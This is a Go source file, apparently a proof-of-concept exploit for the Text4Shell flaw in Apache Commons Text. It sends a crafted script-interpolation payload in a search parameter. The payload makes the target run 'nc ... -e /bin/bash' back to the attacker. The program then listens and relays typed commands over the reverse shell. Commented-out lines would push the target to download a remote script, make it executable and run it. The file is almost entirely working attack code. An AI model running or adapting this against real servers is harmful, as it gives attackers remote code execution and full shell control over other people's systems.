package main


import (
	"fmt"
	"net/http"
	"os"
	"sync"
	"net"
	"time"
	"strings"
	"bufio"
)


const COMMAND = "nc %s %s -e /bin/bash"

//total nonsense lol idk
func handleConn(conn net.Conn){
	//fmt.Println("3. Successfully connected to client.\n4. Downloading package...")

	//fmt.Fprintln(conn, "wget -c 'https://www.dropbox.com/scl/fi/ewiuu2ohu6ivp77o6dd09/test.sh?rlkey=buh5c12o797ujmj3vwugptq0h&dl=1' -O test.sh")
	//time.Sleep(20 * time.Second)
	//fmt.Fprintln(conn, "chmod 777 test.sh")
	//time.Sleep(3 * time.Second)
	//fmt.Fprintln(conn, "./test.sh")
	
	fmt.Println("3. Successfully connected to client.\n4. Opening reverse shell session...")
	for {
		reader := bufio.NewReader(os.Stdin)
		cmd, _ := reader.ReadString('\n')
		fmt.Fprintln(conn, cmd)
		
		p := make([]byte, 1024)
		n, _ := bufio.NewReader(conn).Read(p)
		fmt.Println(string(p[:n]))
    	}

}


func listener(sourceIP string, port string, wg *sync.WaitGroup) {
	addr := fmt.Sprintf("%s:%s", sourceIP, port)

	listener, err := net.Listen("tcp", addr)
	if err != nil{
		fmt.Printf("Error setting up listener: %s\n", err)
		os.Exit(2)
	}
	
	fmt.Printf("1. Listening for connections on %s...\n", listener.Addr().String())

	defer wg.Done()
	for {
		conn, err := listener.Accept()
		if err != nil{
			fmt.Printf("Error accepting connection from client: %s\n", err)
			continue
		} else{
			go handleConn(conn)
		}
	}
}


func createRequest(targetIP string, sourceIP string, port string, command string) *http.Request{
	requestURL := fmt.Sprintf("http://%s/text4shell/attack", targetIP)
        req, err := http.NewRequest("GET", requestURL, nil)
        if err != nil {
                fmt.Printf("Error making http request: %s\n", err)
                os.Exit(3)
        }

        command = fmt.Sprintf(command, sourceIP, port)
        payload := fmt.Sprintf("${script:javascript:java.lang.Runtime.getRuntime().exec('%s')}", command)

        query := req.URL.Query()
        query.Add("search", payload)
        req.URL.RawQuery = query.Encode()
	return req
}


func sendRequest(req *http.Request){
        _, err := http.DefaultClient.Do(req)
        if err != nil {
                fmt.Printf("Error sending http request: %s\n", err)
                os.Exit(3)
        }
}


func payload(targetIP string, sourceIP string, port string, command string, wg *sync.WaitGroup){
	req := createRequest(targetIP, sourceIP, port, command)
	fmt.Printf("2. Delivering payload to %s\n", targetIP)
	sendRequest(req)
	wg.Done()
}


func main() {
	args := os.Args[1:]
	if len(args) > 3 || len(args) < 1 || strings.ToLower(args[0]) == "help"{
		fmt.Println("go run poc.go [target ip] [source ip] [port]")
		os.Exit(1)
	}

	targetIP := args[0]
	sourceIP := args[1]
	port := args[2]

	var wg sync.WaitGroup
	wg.Add(2)

	go listener(sourceIP, port, &wg)
	
	time.Sleep(5 * time.Second)	

	go payload(targetIP, sourceIP, port, COMMAND, &wg)

	wg.Wait()
	fmt.Println("...Program complete.")
	os.Exit(0)
}
